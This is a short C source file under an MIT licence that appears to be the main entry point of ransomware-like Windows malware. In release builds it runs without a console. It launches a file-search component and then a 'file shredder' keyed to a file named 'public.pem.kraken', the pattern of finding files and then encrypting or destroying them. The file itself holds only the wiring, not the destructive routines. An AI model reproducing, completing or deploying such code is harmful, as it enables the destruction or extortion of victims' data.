/*
* MIT License
*
* Copyright (c) 2022 kadzicu
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/

#include "SearchEngineClass.h"
#include "FileShredderClass.h"

#ifndef _DEBUG
int APIENTRY _tWinMain(
    _In_        HINSTANCE   hInstance,
    _In_opt_    HINSTANCE   hPrevInstance,
    _In_        LPTSTR      pCmdLine,
    _In_        int         nCmdShow
)
#else
int _tmain()
#endif 
{
    search_engine_class_t* search_engine_class_obj = search_engine_class_create();
    if (search_engine_class_obj)
    {
        search_engine_class_obj->method->se_start(search_engine_class_obj);
        search_engine_class_obj->method->se_destroy(search_engine_class_obj);
    }

    file_shredder_class_t* file_shredder_class_obj = file_shredder_class_create(_T("public.pem.kraken"));
    if (file_shredder_class_obj)
    {
        file_shredder_class_obj->method->fs_start(file_shredder_class_obj);
        file_shredder_class_obj->method->fs_destroy(file_shredder_class_obj);
    }
}